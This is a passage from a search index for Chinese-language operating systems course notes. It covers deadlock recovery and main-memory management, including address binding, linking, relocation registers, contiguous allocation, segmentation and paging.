<li>\u7b80\u5316\u540e\u7684\u8d44\u6e90\u5206\u914d\u56fe\u4e2d\uff0c\u8fd8\u6709\u8fb9\u76f8\u8fde\u7684\u90a3\u4e9b\u8fdb\u7a0b\u5c31\u662f\u6b7b\u9501\u8fdb\u7a0b</li> </ul> </li> <li>&lt;2&gt; \u64a4\u9500\u8fdb\u7a0b\u6cd5: \u5f3a\u5236\u64a4\u9500\u90e8\u5206\u751a\u81f3\u5168\u90e8\u6b7b\u9501\u8fdb\u7a0b\uff0c\u5e76\u5265\u593a\u8fd9\u4e9b\u8fdb\u7a0b\u7684\u8d44\u6e90<ul> <li>\u8be5\u65b9\u6cd5\u5b9e\u73b0\u7b80\u5355\uff0c\u4f46\u53ef\u80fd\u4f1a\u4ed8\u51fa\u8f83\u5927\u7684\u4ee3\u4ef7</li> </ul> </li> <li>&lt;3&gt; \u8fdb\u7a0b\u56de\u9000\u6cd5: \u8ba9\u4e00\u4e2a\u6216\u591a\u4e2a\u6b7b\u9501\u8fdb\u7a0b\u56de\u5230\u8db3\u4ee5\u56de\u907f\u6b7b\u9501\u7684\u72b6\u6001\uff0c\u8fdb\u7a0b\u56de\u9000\u65f6\u8d44\u6e90\u91ca\u653e\u8d44\u6e90<ul> <li>\u8be5\u65b9\u6cd5\u9700\u8981\u7cfb\u7edf\u4fdd\u6301\u8fdb\u7a0b\u7684\u5386\u53f2\u4fe1\u606f\uff0c\u5e76\u8bbe\u7f6e\u8fd8\u539f\u70b9</li> <li>\u6211\u4eec\u5728\u6570\u636e\u5e93\u5927\u4f5c\u4e1a\u4e2d\u5c31\u4f7f\u7528\u4e86\u8be5\u65b9\u6cd5</li> </ul> </li> </ul>"},{"location":"Courses/OS/Topic4/","title":"Main Memory","text":""},{"location":"Courses/OS/Topic4/#main-memory","title":"Main Memory","text":"<p> \u7ea6 5011 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 25 \u5206\u949f</p>"},{"location":"Courses/OS/Topic4/#memory-management","title":"Memory Management","text":"<p>\u6211\u4eec\u4e0d\u53ef\u80fd\u5c06\u6240\u6709\u8fdb\u7a0b\u4ee5\u53ca\u6240\u9700\u7684\u6570\u636e\u90fd\u653e\u5165 Main Memory \u4e2d\uff0c\u56e0\u6b64\u64cd\u4f5c\u7cfb\u7edf\u5fc5\u987b\u5bf9\u5185\u5b58\u7a7a\u95f4\u8fdb\u884c\u5408\u7406\u7684\u5212\u5206\u548c\u6709\u6548\u7684\u52a8\u6001\u5206\u914d\u3002\u6982\u62ec\u6765\u8bb2\uff0c\u5185\u5b58\u7ba1\u7406\u7684\u4e3b\u8981\u529f\u80fd\u6709\uff1a</p> <ul> <li>&lt;1&gt; \u5185\u5b58\u7a7a\u95f4\u7684\u5206\u914d\u4e0e\u56de\u6536 \u7531\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u5185\u5b58\u7a7a\u95f4\u7684\u5206\u914d\u4e0e\u7ba1\u7406\uff0c\u8bb0\u5f55\u5185\u5b58\u7684\u7a7a\u95f2\u7a7a\u95f4\u3001\u5185\u5b58\u7684\u5206\u914d\u60c5\u51b5\uff0c\u5e76\u56de\u6536\u5df2\u7ed3\u675f\u8fdb\u7a0b\u6240\u5360\u7528\u7684\u5185\u5b58\u7a7a\u95f4</li> <li>&lt;2&gt; \u5730\u5740\u8f6c\u6362 \u7a0b\u5e8f\u7684\u903b\u8f91\u5730\u5740\u4e0e\u5185\u5b58\u4e2d\u7684\u7269\u7406\u5730\u5740\u9700\u8981\u8f6c\u6362</li> <li>&lt;3&gt; \u5185\u5b58\u7a7a\u95f4\u6269\u5145 \u5229\u7528\u865a\u62df\u5b58\u50a8\u6280\u672f\u4ece\u903b\u8f91\u4e0a\u6269\u5145\u5185\u5b58</li> <li>&lt;4&gt; \u5185\u5b58\u5171\u4eab \u5141\u8bb8\u591a\u4e2a\u8fdb\u7a0b\u8bbf\u95ee\u5185\u5b58\u7684\u540c\u4e00\u90e8\u5206\uff0c\u5e76\u4e14\u5bf9\u5185\u5b58\u5171\u4eab\u533a\u57df\u8fdb\u884c\u53d7\u63a7\u8bbf\u95ee</li> <li>&lt;5&gt; \u5b58\u50a8\u4fdd\u62a4 \u4fdd\u8bc1\u5404\u4e2a\u8fdb\u7a0b\u5728\u5404\u81ea\u7684\u5b58\u50a8\u533a\u57df\u8fd0\u884c\uff0c\u4e92\u4e0d\u5e72\u6270</li> </ul>"},{"location":"Courses/OS/Topic4/#logical-physical-address","title":"Logical &amp; Physical Address","text":"<p>Segmentation \u548c Paging \u662f\u6700\u4e3b\u6d41\u7684\u4e24\u79cd Memory Management Schemes\uff0c\u8fd9\u91cc\u7b80\u8981\u5bf9\u4e8c\u8005\u8fdb\u884c\u4e00\u4e9b\u5bf9\u6bd4\uff1a</p> \u5bf9\u6bd4\u9879\u76ee \u5206\u6bb5\uff08Segmentation\uff09 \u5206\u9875\uff08Paging\uff09 \u5927\u5c0f\uff08Size\uff09 \u6bb5\u7684\u5927\u5c0f\u53ef\u53d8\uff0c\u7531\u7528\u6237\u6216\u7f16\u8bd1\u5668\u51b3\u5b9a\uff08\u4f8b\u5982\uff1a\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u3001\u5806\u6808\u6bb5\uff09\u3002 \u9875\u7684\u5927\u5c0f\u56fa\u5b9a\uff08\u4f8b\u5982 4KB\u30018KB\uff09\uff0c\u7531\u786c\u4ef6\u51b3\u5b9a\u3002 \u788e\u7247\uff08Fragmentation\uff09 \u5bb9\u6613\u4ea7\u751f\u5916\u90e8\u788e\u7247\uff08\u56e0\u4e3a\u4e0d\u540c\u6bb5\u5927\u5c0f\u4e0d\u4e00\uff0c\u5185\u5b58\u5206\u914d\u4e0d\u8fde\u7eed\uff09\u3002 \u5bb9\u6613\u4ea7\u751f\u5185\u90e8\u788e\u7247\uff08\u56e0\u4e3a\u6700\u540e\u4e00\u9875\u53ef\u80fd\u6ca1\u88ab\u5b8c\u5168\u7528\u5b8c\uff09\u3002 \u8868\u7ed3\u6784\uff08Tables\uff09 \u4f7f\u7528\u6bb5\u8868\uff08Segment Table\uff09\uff0c\u8bb0\u5f55\u6bcf\u4e2a\u6bb5\u7684\u57fa\u5740\u548c\u957f\u5ea6\uff0c\u67e5\u627e\u901f\u5ea6\u8f83\u5feb\u3002 \u4f7f\u7528\u9875\u8868\uff08Page Table\uff09\uff0c\u8bb0\u5f55\u9875\u53f7\u5bf9\u5e94\u7684\u7269\u7406\u5757\u53f7\u3002\u67e5\u627e\u76f8\u5bf9\u8f83\u6162\uff0c\u4f46TLB\uff08Translation Lookaside Buffer\uff09\u53ef\u52a0\u901f\u3002 Legacy-Mode Memory ManagementLong-Mode Memory Management <p></p> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u5982\u4e0b\u51e0\u4e2a terms \u6765\u6307\u4ee3\u5404\u79cd\u4e0d\u540c\u5730\u5740\uff1a</p> <ul> <li>Effective Addresses\u00a0or\u00a0Segment Offsets<ul> <li>\u6bb5\u5185\u504f\u79fb\u5730\u5740</li> </ul> </li> <li>Logical Addresses<ul> <li>\u903b\u8f91\u5730\u5740\uff0c\u8868\u793a\u5f62\u5f0f\u7c7b\u4f3c\u00a0<code>Seg:Offset</code></li> </ul> </li> <li>Linear Addresses<ul> <li>\u7ebf\u6027\u5730\u5740\uff0c\u76f8\u5f53\u4e8e\u903b\u8f91\u5730\u5740\u7684\u8f6c\u8bd1\uff0c\u662f\u8fde\u7eed\u7684\u5730\u5740</li> <li>\u5982\u679c\u542f\u7528\u4e86 Paging\uff0cLinear Addresses \u76f8\u5f53\u4e8e\u865a\u62df\u5730\u5740 Virtual Addresses</li> </ul> </li> <li>Physical Addresses<ul> <li>\u7269\u7406\u5730\u5740\uff0c\u5728 Memory \u4e2d\u7684\u771f\u5b9e\u5185\u5b58\u5e03\u5c40</li> </ul> </li> </ul> <p>\u6b64\u5185\u5bb9\u6765\u81ea\u4e8e\u6211\u7684\u300c\u6c47\u7f16\u4e0e\u63a5\u53e3\u300d\u7b14\u8bb0\uff0c\u56e0\u6b64\u53ea\u5b66\u64cd\u4f5c\u7cfb\u7edf\u7684\u8bdd\u53ef\u80fd\u4e0d\u77e5\u9053\u8fd9\u51e0\u4e2a Operating Mode \u662f\u4ec0\u4e48\u610f\u601d</p>"},{"location":"Courses/OS/Topic4/#link-load","title":"Link &amp; Load","text":"<p>\u4e00\u4e2a\u7528\u6237\u6e90\u7a0b\u5e8f\u8981\u53d8\u4e3a\u5728\u5185\u5b58\u4e2d\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u901a\u5e38\u9700\u8981\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <p></p> <p>\u5f53\u6211\u4eec\u5199\u597d\u4e00\u4e2a\u7a0b\u5e8f\u65f6\uff0c\u7a0b\u5e8f\u4e2d\u53d8\u91cf\u3001\u51fd\u6570\u3001\u6307\u4ee4\u7b49\u90fd\u53ea\u662f\u4e2a\u201c\u7b26\u53f7\u540d\u201d\uff0c\u6ca1\u6709\u771f\u5b9e\u7684\u7269\u7406\u5730\u5740\u3002</p> <p>\u4e3a\u4e86\u8ba9\u8fd9\u4e9b\u7b26\u53f7\u540d\u7ed1\u5b9a\u5230\u771f\u6b63\u7684\u5185\u5b58\u5730\u5740\u4e0a\uff0c\u6211\u4eec\u6709\u5982\u4e0b\u4e09\u79cd\u5730\u5740\u7ed1\u5b9a\u7684\u65f6\u673a\uff1a</p> <ul> <li>\u7f16\u8bd1\u65f6 \u7edd\u5bf9\u88c5\u5165 \u53d1\u751f\u5728\u7a0b\u5e8f Compile \u65f6\uff0c\u7a0b\u5e8f\u88ab\u52a0\u8f7d\u5230\u7684\u5730\u5740\u7f16\u8bd1\u65f6\u5df2\u786e\u5b9a\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u4ea7\u751f\u7edd\u5bf9\u5730\u5740\u4ee3\u7801<ul> <li>\u53ea\u9002\u7528\u4e8e\u5355\u9053\u7a0b\u5e8f\u73af\u5883\uff0c\u5e76\u4e14\u8981\u6c42\u7a0b\u5e8f\u903b\u8f91\u5730\u5740\u548c\u7269\u7406\u5730\u5740\u5b8c\u5168\u76f8\u540c</li> <li>\u4e00\u65e6\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u6539\u53d8\uff0c\u6240\u6709\u6307\u4ee4\u5f15\u7528\u5730\u5740\u90fd\u6539\u53d8\uff0c\u5219\u9700\u8981\u91cd\u65b0\u7f16\u8bd1</li> </ul> </li> <li>\u88c5\u5165\u65f6 \u9759\u6001\u91cd\u5b9a\u4f4d \u53d1\u751f\u5728\u7a0b\u5e8f Load \u65f6\uff0c\u7a0b\u5e8f\u4e2d\u6307\u4ee4\u548c\u6570\u636e\u7684\u5730\u5740\u90fd\u662f\u76f8\u5bf9\u4e8e\u8d77\u59cb\u5730\u5740\u504f\u79fb\u7684\u903b\u8f91\u5730\u5740<ul> <li>\u5728\u88c5\u5165\u8fc7\u7a0b\u4e2d\u5c06\u76ee\u6807\u7a0b\u5e8f\u4e2d\u7684\u76f8\u5bf9\u5730\u5740\u4fee\u6539\u4e3a\u5b9e\u9645\u7684\u7edd\u5bf9\u5730\u5740</li> <li>\u4e00\u65e6\u52a0\u8f7d\u5b8c\u6210\uff0c\u7a0b\u5e8f\u7684\u5185\u5b58\u4f4d\u7f6e\u5373\u56fa\u5b9a\uff0c\u4e0d\u80fd\u518d\u79fb\u52a8</li> </ul> </li> <li>\u6267\u884c\u65f6 \u52a8\u6001\u91cd\u5b9a\u4f4d \u53d1\u751f\u5728\u7a0b\u5e8f Execute \u65f6\uff0c\u5c06\u76f8\u5bf9\u5730\u5740\u7684\u8ba1\u7b97\u63a8\u8fdf\u5230\u6267\u884c\u65f6\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u4e2a relocation register \u5b58\u50a8\u8d77\u59cb\u5730\u5740\u4f5c\u4e3a\u652f\u6301\uff08\u53c2\u8003 base &amp; limit register\uff09<ul> <li>\u88c5\u5165\u5185\u5b58\u540e\u7684\u6240\u6709\u5730\u5740\u5747\u4e3a\u76f8\u5bf9\u5730\u5740</li> <li>\u82e5\u7a0b\u5e8f\u8981\u5728\u5185\u5b58\u4e2d\u53d1\u751f\u79fb\u52a8\uff0c\u5219\u8981\u91c7\u7528\u52a8\u6001\u7684\u88c5\u5165\u65b9\u6cd5</li> <li>\u53ef\u4ee5\u5c06\u7a0b\u5e8f\u5206\u914d\u5230\u4e0d\u8fde\u7eed\u7684\u5b58\u50a8\u533a\uff0c\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u53ea\u9700\u88c5\u5165\u90e8\u5206\u4ee3\u7801\u5373\u53ef\u8fd0\u884c\uff0c\u7a0b\u5e8f\u8fd0\u884c\u671f\u95f4\u53ef\u4ee5\u52a8\u6001\u7533\u8bf7\u5206\u914d\u5185\u5b58</li> </ul> </li> </ul> <p>\u903b\u8f91\u5730\u5740\u548c\u7269\u7406\u5730\u5740\u5728 Compile-time \u548c Load-time \u662f\u7b49\u4ef7\u7684\uff0c\u5728 Execution-time \u4e0d\u7b49\u4ef7</p> <p>\u5728\u6267\u884c\u94fe\u63a5\u65f6\uff0c\u6839\u636e\u94fe\u63a5\u7684\u65f6\u673a\u4e0d\u540c\uff0c\u6211\u4eec\u4e5f\u53ef\u5206\u51fa\u4ee5\u4e0b\u4e09\u79cd\u94fe\u63a5\u65b9\u5f0f\uff1a</p> <ul> <li>\u9759\u6001\u94fe\u63a5 \u8fd0\u884c\u4e4b\u524d\u5c31\u5c06\u7a0b\u5e8f\u53ca\u6240\u9700\u7684\u5e93\u51fd\u6570\u94fe\u63a5\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u6a21\u5757<ul> <li>\u5c06\u51e0\u4e2a\u76ee\u6807\u6a21\u5757\u88c5\u914d\u6210\u4e00\u4e2a\u88c5\u5165\u6a21\u5757\u65f6\uff0c\u9700\u8981\u5c06\u6bcf\u4e2a\u6a21\u5757\u7684\u5916\u90e8\u8c03\u7528\u7b26\u53f7\u8f6c\u6362\u4e3a\u76f8\u5bf9\u5730\u5740</li> <li>\u7531\u4e8e\u7f16\u8bd1\u540e\u7684\u5355\u4e2a\u76ee\u6807\u6a21\u5757\u7684\u76f8\u5bf9\u5730\u5740\u90fd\u662f\u4ece\u81ea\u8eab 0 \u5f00\u59cb\uff0c\u9759\u6001\u94fe\u63a5\u540e\u9700\u8981\u4fee\u6539\u8fd9\u4e9b\u76f8\u5bf9\u5730\u5740</li> </ul> </li> <li>\u88c5\u5165\u65f6\u52a8\u6001\u94fe\u63a5 \u5728\u88c5\u5165\u5185\u5b58\u65f6\uff0c\u8fb9\u88c5\u5165\u8fb9\u94fe\u63a5<ul> <li>\u4f18\u70b9\u662f\u4fbf\u4e8e\u4fee\u6539\u548c\u66f4\u65b0\uff0c\u4fbf\u4e8e\u5b9e\u73b0\u5bf9\u76ee\u6807\u6a21\u5757\u7684\u5171\u4eab</li> </ul> </li> <li>\u8fd0\u884c\u65f6\u52a8\u6001\u94fe\u63a5 \u5f53\u7a0b\u5e8f\u6267\u884c\u65f6\u9700\u8981\u67d0\u52a8\u6001\u6a21\u5757\u65f6\uff0c\u624d\u5bf9\u5b83\u8fdb\u884c\u94fe\u63a5<ul> <li>\u4f18\u70b9\u662f\u52a0\u5feb\u6a21\u5757\u88c5\u5165\u8fc7\u7a0b\uff0c\u8282\u7701\u5185\u5b58\u7a7a\u95f4</li> <li>\u53ef\u6267\u884c\u6587\u4ef6\u4f53\u79ef\u66f4\u5c0f\uff0c\u4e14\u5f53\u5e93\u66f4\u65b0\u65f6\u4e0d\u9700\u8981\u91cd\u65b0\u94fe\u63a5\u53ef\u6267\u884c\u5e93</li> </ul> </li> </ul> <p>\u5185\u5b58\u4e2d\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u7528\u6237\u8fdb\u7a0b\uff0c\u4e3a\u4e86\u9632\u6b62\u7528\u6237\u8fdb\u7a0b\u4fee\u6539\u522b\u7684\u8fdb\u7a0b\u5185\u5b58\u548c\u64cd\u4f5c\u7cfb\u7edf\u5185\u5b58\uff0c\u6211\u4eec\u5f15\u5165 Relocate Register \u548c Limit Register \u4e24\u4e2a\u5173\u952e\u5bc4\u5b58\u5668\u3002</p> \u5bc4\u5b58\u5668 \u542b\u4e49 \u4f5c\u7528 Relocation Register\uff08\u91cd\u5b9a\u4f4d\u5bc4\u5b58\u5668\uff09 \u5b58\u653e\u5f53\u524d\u8fdb\u7a0b\u5728\u5185\u5b58\u4e2d\u7684\u8d77\u59cb\u7269\u7406\u5730\u5740\uff08\u6700\u5c0f\u7269\u7406\u5730\u5740\uff09 \u6240\u6709\u903b\u8f91\u5730\u5740\u90fd\u8981\u52a0\u4e0a\u8fd9\u4e2a\u503c\uff0c\u624d\u80fd\u5f97\u5230\u5b9e\u9645\u7269\u7406\u5730\u5740\u3002 Limit Register\uff08\u754c\u9650\u5bc4\u5b58\u5668\uff09 \u5b58\u653e\u5f53\u524d\u8fdb\u7a0b\u903b\u8f91\u5730\u5740\u7a7a\u95f4\u7684\u5927\u5c0f \u6bcf\u4e2a\u903b\u8f91\u5730\u5740\u5fc5\u987b\u5c0f\u4e8e\u8fd9\u4e2a\u503c\uff0c\u5426\u5219\u89e6\u53d1\u201c\u8d8a\u754c\u9519\u8bef\u201d\u3002 <p></p> <p>\u52a0\u8f7d\u91cd\u5b9a\u4f4d\u5bc4\u5b58\u5668\u548c\u754c\u5730\u5740\u5bc4\u5b58\u5668\u5fc5\u987b\u4f7f\u7528\u7279\u6743\u6307\u4ee4\uff0c\u5373\u53ea\u6709\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u53ef\u4ee5\u52a0\u8f7d</p>"},{"location":"Courses/OS/Topic4/#contiguous-allocation","title":"Contiguous Allocation","text":"<p>\u5b58\u50a8\u7ba1\u7406\u65b9\u5f0f\u968f\u7740\u64cd\u4f5c\u7cfb\u7edf\u7684\u53d1\u5c55\u800c\u53d1\u5c55\u3002\u5728\u64cd\u4f5c\u7cfb\u7edf\u7531\u5355\u9053\u5411\u591a\u9053\u53d1\u5c55\u65f6\uff0c\u5b58\u50a8\u7ba1\u7406\u65b9\u5f0f\u7684\u53d8\u5316\u4e3a\u5355\u4e00\u8fde\u7eed\u5206\u914d =&gt; \u56fa\u5b9a\u5206\u533a\u5206\u914d =&gt; \u52a8\u6001\u5206\u533a\u5206\u914d\u3002\u4e3a\u4e86\u66f4\u597d\u63d0\u9ad8\u5185\u5b58\u7684\u5229\u7528\u7387\uff0c\u6700\u540e\u53c8\u4ece\u8fde\u7eed\u5206\u914d\u65b9\u5f0f\u53d1\u5c55\u5230\u79bb\u6563\u5206\u914d\u65b9\u5f0f\u2014\u2014\u9875\u5f0f\u5b58\u50a8\u7ba1\u7406\u3002</p> <p>Contiguous Allocation \u6307\u4e3a\u4e00\u4e2a\u7528\u6237\u7a0b\u5e8f\u5206\u914d\u4e00\u4e2a\u8fde\u7eed\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u5185\u5b58\u88ab\u5212\u5206\u4e3a\u7cfb\u7edf\u533a\u548c\u7528\u6237\u533a\uff0c\u7cfb\u7edf\u533a\u4f4d\u4e8e\u4f4e\u5730\u5740\uff0c\u800c\u7528\u6237\u533a\u4f4d\u4e8e\u9ad8\u5730\u5740\u3002</p> <p>\u5176\u4e2d\u5355\u4e00\u8fde\u7eed\u5206\u914d\u6307\u7528\u6237\u533a\u5185\u5b58\u4e2d\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u7528\u6237\u7a0b\u5e8f\uff0c\u6b64\u65b9\u5f0f\u5b9e\u73b0\u7b80\u5355\u3001\u65e0\u5916\u90e8\u788e\u7247\u3001\u4e0d\u9700\u8981\u8fdb\u884c\u5185\u5b58\u4fdd\u62a4\uff0c\u4f46\u662f\u6709\u5185\u90e8\u788e\u7247\uff0c\u4e14\u5185\u5b58\u5229\u7528\u7387\u6781\u4f4e\u3002</p> <p>\u56fa\u5b9a\u5206\u533a\u5206\u914d\uff0c\u4ea6\u5373 Multiple-partition Allocation \u662f\u6700\u7b80\u5355\u7684\u591a\u9053\u7a0b\u5e8f\u5b58\u50a8\u7ba1\u7406\u65b9\u5f0f\uff0c\u5b83\u5c06\u7528\u6237\u533a\u5212\u5206\u4e3a\u82e5\u5e72\u56fa\u5b9a\u5927\u5c0f\u7684\u5206\u533a\uff08hole\uff09\uff0c\u6bcf\u4e2a\u5206\u533a\u53ea\u88c5\u5165\u4e00\u4e2a\u4f5c\u4e1a\uff0c\u5206\u533a\u7684\u5927\u5c0f\u53ef\u4ee5\u4e0d\u7b49\uff0c\u901a\u8fc7\u5206\u533a\u4f7f\u7528\u8868\u8fdb\u884c\u7ef4\u62a4\u3002\u56fa\u5b9a\u5206\u533a\u5206\u914d\u65b9\u5f0f\u4e5f\u4e0d\u5b58\u5728\u5916\u90e8\u788e\u7247\uff0c\u4f46\u662f\u5f53\u7a0b\u5e8f\u5c0f\u4e8e\u56fa\u5b9a\u5206\u533a\u5927\u5c0f\u65f6\uff0c\u4e5f\u4f1a\u4ea7\u751f\u5185\u90e8\u788e\u7247\u3002</p> <p>\u52a8\u6001\u5206\u533a\u5206\u914d\u4e5f\u53eb\u505a\u53ef\u53d8\u5206\u533a\u5206\u914d\uff0c\u5b83\u7684\u5206\u533a\u7684\u5927\u5c0f\u548c\u6570\u91cf\u662f\u53ef\u53d8\u7684\uff0c\u901a\u8fc7\u4e00\u5b9a\u7b97\u6cd5\u4f7f\u5f97\u5206\u914d\u7684\u5206\u533a\u5927\u5c0f\u6b63\u597d\u9002\u5408\u8fdb\u7a0b\u7684\u9700\u8981\u3002</p> <p>\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\uff0c\u52a8\u6001\u5206\u533a\u5206\u914d\u65b9\u5f0f\u96be\u514d\u4f1a\u4ea7\u751f\u5916\u90e8\u788e\u7247\uff0c\u5b83\u5b58\u5728\u4e8e\u6240\u6709\u5206\u533a\u7684\u5916\u90e8\uff0c\u4e8e\u5185\u90e8\u788e\u7247\u6982\u5ff5\u76f8\u5bf9\u3002\u4f8b\u5982\u5982\u4e0b\u4f8b\u5b50\uff1a</p> <p></p> <p>\u5916\u90e8\u788e\u7247\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u5468\u671f\u6027\u7684\u7d27\u51d1\u6280\u672f\u6765\u514b\u670d\uff0c\u5373\u5bf9\u5185\u5b58\u788e\u7247\u8fdb\u884c\u6574\u7406</p> <p>\u52a8\u6001\u5206\u533a\u5206\u914d\u65b9\u5f0f\u4f7f\u7528\u7a7a\u95f2\u5206\u533a\u94fe\u6765\u7ef4\u62a4\u5206\u533a\u3002\u5f53\u8fdb\u7a0b\u8981\u8fdb\u5165\u4e3b\u5b58\u65f6\uff0c\u9700\u8981\u6309\u7167\u4e00\u5b9a\u7684\u5206\u914d\u7b97\u6cd5\u4ece\u7a7a\u95f2\u5206\u533a\u94fe\u4e2d\u9009\u51fa\u4e00\u4e2a\u5206\u533a\u3002 \u6309\u7167\u5206\u533a\u68c0\u7d22\u65b9\u5f0f\uff0c\u53ef\u5206\u4e3a\u987a\u5e8f\u5206\u914d\u65b9\u6cd5\u548c\u7d22\u5f15\u5206\u914d\u65b9\u6cd5\uff1a</p> <ul> <li>\u987a\u5e8f\u5206\u914d\u65b9\u6cd5 \u5305\u62ec First-Fit\uff0cNext-Fit\uff0cBest-Fit\uff0cWorst-Fit \u7b49<ul> <li>\u901a\u5e38\uff0cFirst-Fit &gt; Next-Fit \u2248 Best-Fit &gt; Worst-Fit</li> </ul> </li> <li>\u7d22\u5f15\u5206\u914d\u65b9\u6cd5 \u5305\u62ec\u5feb\u901f\u9002\u5e94\u7b97\u6cd5\uff0c\u4f19\u4f34\u7cfb\u7edf\uff0c\u54c8\u5e0c\u7b97\u6cd5\u7b49</li> </ul> <p>\u5728\u8fde\u7eed\u5206\u914d\u4e2d\uff0c\u5373\u4fbf\u5185\u5b58\u6709\u8d85\u8fc7 1GB \u7684\u7a7a\u95f2\u7a7a\u95f4\uff0c\u4f46\u82e5\u8be5 1GB \u7a7a\u95f4\u4e0d\u8fde\u7eed\uff0c\u5219\u4ecd\u7136\u65e0\u6cd5\u8fd0\u884c\u4e00\u4e2a 1GB \u7a7a\u95f4\u4f5c\u4e1a\uff0c\u4f46\u82e5\u91c7\u7528\u975e\u8fde\u7eed\u5206\u914d\u65b9\u5f0f\uff0c\u5219\u4f5c\u4e1a\u8981\u6c42\u7684 1GB \u7a7a\u95f4\u53ef\u4ee5\u5206\u6563\u5728\u5185\u5b58\u7684\u5404\u4e2a\u533a\u57df\u3002</p> <p>\u5f53\u7136\uff0c\u975e\u8fde\u7eed\u5206\u914d\u65b9\u5f0f\u9700\u8981\u989d\u5916\u7684\u7a7a\u95f4\u5b58\u50a8\u5206\u6563\u533a\u57df\u7684\u7d22\u5f15\uff0c\u56e0\u6b64\u975e\u8fde\u7eed\u5206\u914d\u7684\u5b58\u50a8\u5bc6\u5ea6\u4f4e\u4e8e\u8fde\u7eed\u5206\u914d\u65b9\u5f0f\u3002\u6839\u636e\u5206\u533a\u7684\u5927\u5c0f\u662f\u5426\u56fa\u5b9a\uff0c\u6211\u4eec\u5c06\u975e\u8fde\u7eed\u5206\u914d\u5212\u5206\u4e3a\u5206\u6bb5\u5b58\u50a8\u7ba1\u7406\u548c\u5206\u9875\u5b58\u50a8\u7ba1\u7406\u3002</p>"},{"location":"Courses/OS/Topic4/#segmentation-architecture","title":"Segmentation Architecture","text":"<p>\u5206\u6bb5\u5f0f\u662f\u5bf9\u7a0b\u5e8f\u5458\u66f4\u53cb\u597d\u7684\u4e00\u79cd\u7ba1\u7406\u65b9\u5f0f\uff0c\u5b83\u5c06\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u7684\u903b\u8f91\u5730\u5740\u7a7a\u95f4\u5212\u5206\u4e3a\u5927\u5c0f\u4e0d\u7b49\u7684\u6bb5\uff0c\u4f8b\u5982\u4e3b\u7a0b\u5e8f\u6bb5\u3001\u5b50\u7a0b\u5e8f\u6bb5\u3001\u6808\u6bb5\u3001\u6570\u636e\u6bb5\u7b49\u3002</p> <p>\u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u6bb5\u5bc4\u5b58\u5668\u4e0d\u518d\u5355\u72ec\u5b58\u50a8\u6bb5\u5730\u5740\uff0c\u800c\u662f\u5b58\u50a8\u6307\u5411\u00a0Descriptor Table\u00a0\u4e2d\u7684\u67d0\u4e00\u63cf\u8ff0\u7b26\u7684\u00a0Selector\u3002</p> <p>\u4f8b\u5982\u5bf9\u4e8e\u6307\u4ee4 <code>MOV [BX], AX</code>\uff0c\u5b83\u7684\u8bbf\u5b58\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p></p> <p>\u4e00\u4e2a Descriptor \u5305\u542b\u8be5\u6bb5\u5728\u5185\u5b58\u4e2d\u8d77\u59cb\u5730\u5740 Base \u548c\u6bb5\u7684\u957f\u5ea6 Limit\u3002\u6267\u884c\u4e2d\u7684\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7\u67e5\u627e\u6bb5\u8868\u627e\u5230\u6bcf\u6bb5\u5bf9\u5e94\u7684\u5185\u5b58\u533a\u3002</p> <ul> <li>Segment-table base register, STBR \u6307\u5411 Segment Table \u7684\u7269\u7406\u8d77\u59cb\u5730\u5740</li> <li>Segment-table length register, STLR \u8868\u793a\u4e00\u4e2a\u7a0b\u5e8f\u7684\u5206\u6bb5\u6570\u91cf</li> </ul> <p>\u66f4\u8be6\u7ec6\u7684\u5185\u5bb9\uff0c\u53ef\u89c1The Microprocessor and its Architecture - Nimisora's Notes</p>"},{"location":"Courses/OS/Topic4/#paging-architecture","title":"Paging Architecture","text":"<p>\u5206\u9875\u601d\u60f3\u5c06\u7269\u7406\u5185\u5b58\u7a7a\u95f4\u5212\u5206\u4e3a\u82e5\u5e72\u56fa\u5b9a\u5927\u5c0f\uff08\u901a\u5e38\u4e3a 4KB\uff09\u7684\u5206\u533a\uff0c\u79f0\u4e3a Frame\uff0c\u5c06\u903b\u8f91\u5185\u5b58\u7a7a\u95f4\u5212\u5206\u4e3a\u540c\u6837\u56fa\u5b9a\u5927\u5c0f\u7684\u5206\u533a\uff0c\u79f0\u4e3a Page\u3002</p> <p>\u5206\u9875\u7ba1\u7406\u4e0d\u4f1a\u4ea7\u751f\u5916\u90e8\u788e\u7247\uff0c\u800c\u5185\u90e8\u788e\u7247\u4e5f\u53ea\u4f1a\u5728\u7cfb\u7edf\u4e3a\u8fdb\u7a0b\u7533\u8bf7\u7684\u6700\u540e\u4e00\u4e2a\u5206\u533a\u4e2d\u51fa\u73b0\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5e73\u5747\u53ea\u4f1a\u4ea7\u751f\u534a\u4e2a\u5757\u5927\u5c0f\u7684\u5185\u90e8\u788e\u7247\u3002</p> <p>\u4ee5\u4e0b\u5185\u5bb9\u4e5f\u6765\u81ea\u6211\u7684\u300c\u6c47\u7f16\u4e0e\u63a5\u53e3\u300d\u7b14\u8bb0</p> <p>\u4e0e\u8ba1\u7ec4\u4e2d\u5b66\u5230\u7684\u5206\u9875\u7a0d\u6709\u533a\u522b\u7684\u662f\uff0c\u73b0\u5b9e CPU \u901a\u5e38\u4f1a\u91c7\u7528 Multi-level Paging\uff0c\u800c\u4e0d\u662f\u53ea\u901a\u8fc7\u4e00\u4e2a Page Table 